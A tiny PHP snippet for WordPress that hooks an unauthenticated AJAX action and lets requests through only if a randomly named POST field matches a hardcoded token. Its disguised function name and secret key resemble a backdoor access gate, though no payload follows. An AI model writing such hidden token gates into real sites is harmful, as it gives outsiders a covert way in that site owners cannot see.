<?php

function slider_access_sticky_framework() {
	if (!isset($_POST["fxfnleiqvrb"]) || $_POST["fxfnleiqvrb"] !== "tttUfQIM") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'slider_access_sticky_framework', 5, 1);
